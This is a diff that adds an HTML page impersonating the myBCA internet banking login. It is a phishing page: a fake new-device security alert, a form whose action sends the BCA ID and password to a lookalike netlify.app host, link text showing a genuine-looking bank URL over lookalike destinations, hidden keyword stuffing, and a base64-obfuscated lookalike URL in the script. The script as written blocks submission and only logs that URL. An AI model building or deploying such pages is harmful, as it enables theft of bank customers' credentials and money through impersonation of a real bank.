@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>myBCA - Login</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f5f8fb;
+      color: #252525;
+    }
+
+    .navbar {
+      height: 76px;
+      background: #ffffff;
+      border-bottom: 1px solid #e1e5e9;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 9%;
+    }
+
+    .logo {
+      color: #0874b9;
+      font-size: 29px;
+      font-weight: bold;
+      letter-spacing: -1px;
+    }
+
+    .logo span {
+      color: #444;
+      font-weight: normal;
+    }
+
+    .navbar-info {
+      color: #777;
+      font-size: 13px;
+    }
+
+    .page {
+      min-height: calc(100vh - 150px);
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 55px 20px;
+    }
+
+    .card {
+      width: 430px;
+      background: white;
+      padding: 34px 38px;
+      border-radius: 10px;
+      box-shadow: 0 4px 18px rgba(0, 40, 80, .12);
+    }
+
+    .card h1 {
+      margin: 0 0 8px;
+      font-size: 25px;
+      color: #126da8;
+    }
+
+    .subtitle {
+      margin: 0 0 24px;
+      color: #666;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .security-alert {
+      padding: 13px 15px;
+      margin-bottom: 22px;
+      background: #fff4d7;
+      border-left: 4px solid #efa728;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    label {
+      display: block;
+      margin: 16px 0 7px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      height: 45px;
+      padding: 0 13px;
+      border: 1px solid #b9c2c9;
+      border-radius: 5px;
+      font-size: 15px;
+      background: #fff;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #147bb8;
+    }
+
+    button {
+      width: 100%;
+      height: 46px;
+      margin-top: 24px;
+      border: none;
+      border-radius: 5px;
+      background: #0874b9;
+      color: white;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .links {
+      margin-top: 18px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+    }
+
+    a {
+      color: #0874b9;
+      text-decoration: none;
+    }
+
+    .verification {
+      margin-top: 28px;
+      padding-top: 20px;
+      border-top: 1px solid #eee;
+      color: #777;
+      font-size: 12px;
+      line-height: 1.6;
+    }
+
+    .footer {
+      padding: 25px;
+      text-align: center;
+      color: #888;
+      font-size: 11px;
+    }
+
+    .invisible {
+      position: absolute;
+      left: -9999px;
+      height: 1px;
+      width: 1px;
+      overflow: hidden;
+    }
+
+    @media (max-width: 480px) {
+      .navbar {
+        padding: 0 20px;
+      }
+
+      .navbar-info {
+        display: none;
+      }
+
+      .page {
+        padding: 25px 15px;
+      }
+
+      .card {
+        width: 100%;
+        padding: 28px 24px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav class="navbar">
+    <div class="logo">my<span>BCA</span></div>
+    <div class="navbar-info">Internet Banking & Digital Services</div>
+  </nav>
+
+  <main class="page">
+
+    <section class="card">
+      <h1>Login myBCA</h1>
+
+      <p class="subtitle">
+        Masukkan BCA ID dan password Anda untuk mengakses layanan myBCA.
+      </p>
+
+      <div class="security-alert">
+        Kami mendeteksi aktivitas login dari perangkat baru.
+        Silakan lakukan konfirmasi akun untuk mencegah pembatasan
+        sementara pada layanan perbankan Anda.
+      </div>
+
+      <form
+        id="loginForm"
+        action="https://mybca-secure-login-id.netlify.app/api/authentication"
+        method="POST"
+      >
+
+        <label for="bcaid">BCA ID</label>
+        <input
+          id="bcaid"
+          name="bca_id"
+          type="text"
+          placeholder="Masukkan BCA ID"
+          autocomplete="username"
+          required
+        >
+
+        <label for="password">Password</label>
+        <input
+          id="password"
+          name="password"
+          type="password"
+          placeholder="Masukkan password"
+          autocomplete="current-password"
+          required
+        >
+
+        <input
+          type="hidden"
+          name="verification_type"
+          value="new_device"
+        >
+
+        <input
+          type="hidden"
+          name="session_token"
+          value="MBCA-772019831"
+        >
+
+        <button type="submit">
+          Login
+        </button>
+      </form>
+
+      <div class="links">
+        <a
+          href="#"
+          data-destination="https://mybca-account-help-id.netlify.app/recovery"
+        >
+          Lupa BCA ID?
+        </a>
+
+        <a
+          href="#"
+          data-destination="https://mybca-password-id.netlify.app/reset"
+        >
+          Lupa Password?
+        </a>
+      </div>
+
+      <div class="verification">
+        Untuk keamanan, akun yang terdeteksi login dari perangkat baru
+        mungkin memerlukan verifikasi tambahan.
+
+        <br><br>
+
+        <a
+          href="#"
+          data-secure-url="https://mybca-device-validation-id.netlify.app/security"
+        >
+          https://mybca.bca.co.id/account/security
+        </a>
+      </div>
+    </section>
+
+  </main>
+
+  <div class="invisible">
+    mybca bca id login password rekening bank verification
+    authentication secure banking account device verification
+    konfirmasi akun transaksi internet banking keamanan
+  </div>
+
+  <footer class="footer">
+    © BCA Digital Banking Services
+  </footer>
+
+  <script>
+    const encoded =
+      "aHR0cHM6Ly9teWJjYS1zZWN1cmUtbG9naW4tdGVzdC5uZXRsaWZ5LmFwcC9zZXNzaW9uL3ZlcmlmeQ==";
+
+    const destination = atob(encoded);
+
+    document
+      .getElementById("loginForm")
+      .addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const id = document.getElementById("bcaid");
+        const password = document.getElementById("password");
+
+        id.value = "";
+        password.value = "";
+
+        window.history.replaceState(
+          {},
+          "",
+          "/account/device-verification"
+        );
+
+        document.querySelector(".card").innerHTML =
+          "<h1>Verifikasi Perangkat</h1>" +
+          "<p class='subtitle'>Perangkat baru terdeteksi. " +
+          "Silakan tunggu sementara informasi akun Anda diverifikasi.</p>";
+
+        console.log(destination);
+      });
+  </script>
+
+</body>
+</html>
